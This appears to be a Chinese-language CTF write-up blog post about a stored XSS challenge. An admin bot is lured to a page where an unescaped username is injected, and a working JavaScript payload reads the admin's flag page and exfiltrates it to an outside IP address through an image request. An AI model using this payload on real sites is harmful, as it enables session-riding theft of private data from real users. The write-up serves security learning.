---
title: 存储型 XSS 注入 + Admin Bot 提权 + XSS 外带
date: 2026-08-14 23:00:00
categories:
  - CTF wp
tags:
  - CTF
  - XSS
  - Admin Bot
disableNunjucks: true
description: 存储型 XSS 注入 + Admin Bot 提权 + XSS 外带
---

#### 拿到源码先看什么？
##### 1.app.py: 先把所有路由列出来，搞清楚网站有什么功能  
##### 2.找漏洞：
 view_encoding.html  ：

```plain
<div class="subtitle">{{encoding|safe}}</div>
```

`|safe` = 不过滤直接输出。这是一个 **sink**。问题是：它输出的 `encoding` 里有什么我们可控？

##### 3.确认注入点：
**整体的逻辑：发送信息，经过base91编码，在/s/sid 路径下回显发送的内容，回显包括经过base91编码的内容和注册时设置的用户名**

/s/ 路由里：

```plain
signal = read_signal(sid, session.get("callsign"))
return render_template("view_encoding.html", encoding=signal)
```

signal 是一个 dict：{"text": base91密文, "creator": 笔记owner}。

Jinja2 渲染一个 dict 时会调用 str(dict)，输出它的 repr：{'text': 'AbC...', 'creator': 'admin'}

所以页面 HTML 实际长这样。而` |safe `保证尖括号原样渲染。

注意：repr 自动转义引号和反斜杠  
creator 就是我们注册时的用户名，原样进 dict repr，原样进 HTML。

**所以注入点不在 text，在 username**

##### 4.bot:  alienbot.js
**经验**：CTF Web 题里，只要出现 `bot`、`puppeteer`、`headless`、`chromium` 这类关键词，**99% 考 XSS**。因为 bot 的作用就是模拟管理员访问页面，触发你的 XSS。  

**外带 **= 让 bot 的浏览器（在 admin 会话里）主动把读到的 flag 数据，当成一个"请求"发到你自己的服务器上。

##### 5.构造payload
先定目标：XSS 在 admin 会话里要做什么

拿 admin 的 dashboard → 里面有 flag 的 sid

请求 /s/<flag_sid> → 读到 flag（base91 密文）

把内容发到我的服务器（外带）

**注册时username为:**

```plain
<script>
fetch("/").then(r=>r.text()).then(h=>{
let s=h.split("/s/")[1].substring(0,40);
fetch("/s/"+s).then(r=>r.text()).then(t=>{
new Image().src="http://120.53.249.234:8080/?d="+encodeURIComponent(t);
});
});
</script>
```

评论区的payload：（逆向思维->91编码）

```plain
f0ef71053aa76696f8f6d7ea80d74bcf03fa874e059795971fc18afbf221fa6b0503f7fa1b7ee854705979f9110cb9a75607bc5e7abefd01fad888e87fdd0e23f32318497fe8408c323b7afedb61c66aafffca170a861f3a155c565e7e042beecb87e8af150cdceb6ff8a153c165e5e54770e4ae6b1c2a036a39c30dc158e09de6d19f1153bad58799ac3c2bac44d1861e5e81a856f77ebd301ca6e000
```

解析：

```plain
fetch("/")                                   // ① admin 身份拿 dashboard
  .then(r => r.text())                       // ② 读 HTML 文本
  .then(h => {                               // ③ 从 HTML 里抠出 flag 的 sid
    let s = h.split("/s/")[1].substring(0,40);
    fetch("/s/" + s).then(r => r.text())     // ④ 读 flag 页面
      .then(t => {
        new Image().src = "http://120.53.249.234:8080/?d=" + encodeURIComponent(t);  // ⑤ 外带
      });
  }); 
```

服务器监听：python3 -m http.server 8080

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-stored-xss-admin-bot-001.png)

url解码

<!-- 这是一张图片，ocr 内容为： -->
![](/img/ctf/ctf-stored-xss-admin-bot-002.png)

带出整个页面，得到flag





